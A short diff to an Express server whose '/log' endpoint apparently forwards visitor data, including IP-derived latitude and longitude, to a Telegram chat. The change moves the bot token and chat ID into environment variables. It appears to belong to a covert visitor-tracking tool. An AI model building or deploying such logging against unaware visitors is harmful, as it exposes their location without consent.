@@ -4,6 +4,11 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = 3000;
 
+const botToken = process.env.BOT_TOKEN;
+const chatId = process.env.CHAT_ID;
+
+app.use(bodyParser.json());
+app.use(express.static('public'));
 
 app.post('/log', async (req, res) => {
   const data = req.body;
@@ -23,11 +28,11 @@ app.post('/log', async (req, res) => {
 🔗 Lat/Long: ${ipInfo.loc}
   `;
 
-  await fetch(`https://api.telegram.org/botSEU_BOT_TOKEN/sendMessage`, {
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      chat_id: "SEU_CHAT_ID",
+      chat_id: chatId,
       text: mensagem
     })
   });
